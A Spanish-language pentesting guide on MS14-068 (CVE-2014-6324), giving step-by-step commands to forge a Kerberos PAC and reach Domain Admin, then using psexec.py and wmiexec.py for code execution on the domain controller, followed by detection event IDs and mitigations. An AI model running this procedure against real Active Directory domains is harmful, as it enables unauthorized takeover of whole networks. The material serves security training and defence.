# MS14-068: de usuario a Domain Admin con un PAC forjado

[🇬🇧 English](ms14-068.en.md) | **Español**

## 1. Qué falla

Kerberos en Active Directory adjunta un **PAC** (Privilege Attribute Certificate) al TGT. El PAC lista los grupos del usuario y va firmado por el KDC. En controladores sin **KB3011780**, el KDC no valida correctamente la firma cuando el cliente presenta un TGT manipulado: un usuario normal puede construir un PAC con `Domain Admins` y pedir un TGT válido.

- CVE: **CVE-2014-6324**
- Afecta: Windows Server 2003/2008/2008 R2/2012/2012 R2 sin el parche de noviembre de 2014.
- Requisitos: una cuenta de dominio válida (usuario o contraseña/hash), el SID del usuario, el dominio y un DC accesible.

No requiere privilegios previos ni un dominio mal configurado. Es una vulnerabilidad del propio KDC.

## 2. Datos necesarios

```bash
nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --users
```

Se necesitan:

- `DOMAIN` en formato `CORP.LOCAL`.
- `USER` y `PASSWORD` (o el hash NT para `-hashes`).
- `USER_SID`: se obtiene con `lookupsid.py`, `nxc --users` o BloodHound.
- `DC_IP` y el nombre del DC.

```bash
lookupsid.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' | grep '<USER>'
```

## 3. Forja y uso

```bash
python3 ms14-068.py -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
  -s '<USER_SID>' -d <DC_IP>
export KRB5CCNAME=./<USER>.ccache
klist
```

El script pide un TGT con el PAC manipulado y guarda el `.ccache`. Con el ticket:

```bash
psexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
wmiexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
nxc smb <DC_IP> -k --shares
```

Si el reloj está desincronizado, aparece `KRB_AP_ERR_SKEW`. Se ajusta la hora o se usa `faketime`; el ticket tiene una vida limitada.

## 4. Variantes

- **Sin contraseña en claro**: `ms14-068.py` acepta `-a <NT_HASH>` en algunas versiones; si no, se usa `getTGT.py` con `-hashes` y luego se forja el PAC.
- **Con sesión existente**: se puede pedir el TGT normal, extraer el SID y volver a forjar el PAC.
- **Solo LDAP**: si no hay 445, el ticket sirve para LDAP y se enumera el dominio, pero para ejecutar código hace falta SMB/WMI/WinRM.

## 5. Detección

- **4768** (TGT solicitado) con un PAC que contiene grupos que el usuario no tiene.
- **4769** posterior desde el mismo origen.
- **4624** tipo 3 en el DC desde una estación no habitual.
- **7045** si se crea un servicio para ejecutar código.
- El `.ccache` en disco y el uso de `psexec`/`wmiexec` con `-k -no-pass`.

No hay un evento único de “PAC forjado”; la correlación es la que delata.

## 6. Mitigación

- Aplicar **KB3011780** en todos los DC y verificar el nivel de parcheo.
- Auditar cuentas con contraseñas débiles o reutilizadas: son el punto de entrada.
- Limitar el acceso a SMB/WMI/WinRM desde estaciones de usuario.
- Monitorizar 4768 con grupos anómalos y el uso de tickets desde hosts no gestionados.
- Rotar credenciales tras un incidente y revisar cuentas creadas.

MITRE: T1558, T1078, T1021.002.
